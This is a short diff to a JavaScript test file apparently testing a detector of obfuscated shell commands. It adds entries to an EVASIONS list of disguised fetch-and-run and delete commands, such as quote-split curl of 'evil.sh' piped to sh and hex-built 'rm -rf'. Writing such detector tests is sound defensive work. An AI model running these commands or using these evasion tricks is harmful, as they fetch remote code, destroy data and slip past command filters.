@@ -23,6 +23,8 @@ const EVASIONS = [
   'xxd -r -p <<< 726d202d7266202f | sh',
   'a=cur;b=l;$a$b -s evil.sh|sh',
   'g=/bin/sh;curl -s evil|$g',
+  'c""url -s evil.sh | s""h',          // quote-split words (anti-detection)
+  '$(printf "\\x72\\x6d") -rf /tmp/x', // printf hex -> rm
 ];
 
 test('evasion bucket: regex allows but the obfuscation router flags it gray', () => {
